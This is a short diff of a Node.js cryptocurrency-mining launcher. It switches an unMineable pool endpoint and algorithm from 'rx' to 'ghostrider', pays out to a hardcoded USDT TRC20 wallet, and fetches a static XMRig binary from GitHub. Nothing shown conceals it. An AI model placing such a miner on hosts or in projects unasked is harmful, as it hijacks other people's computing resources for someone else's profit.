@@ -4,10 +4,10 @@ const https = require('https');
 
 // === CONFIG ===
 // USDT payout memakai alamat TRON/TRC20.
-const ADDR = 'rx.unmineable.com:3333';
+const ADDR = 'ghostrider.unmineable.com:3333';
 const AUTH_KEY = 'USDT:TJm8qGE5gmMVcfwFTmWBqwrjSkDFnhs81x#c5kh-a9zb';
 const PASS = 'x';
-const MODE = 'rx';
+const MODE = 'ghostrider';
 
 const XMRIG_VERSION = '6.26.0';
 const REMOTE_URL = `https://github.com/xmrig/xmrig/releases/download/v${XMRIG_VERSION}/xmrig-${XMRIG_VERSION}-linux-static-x64.tar.gz`;
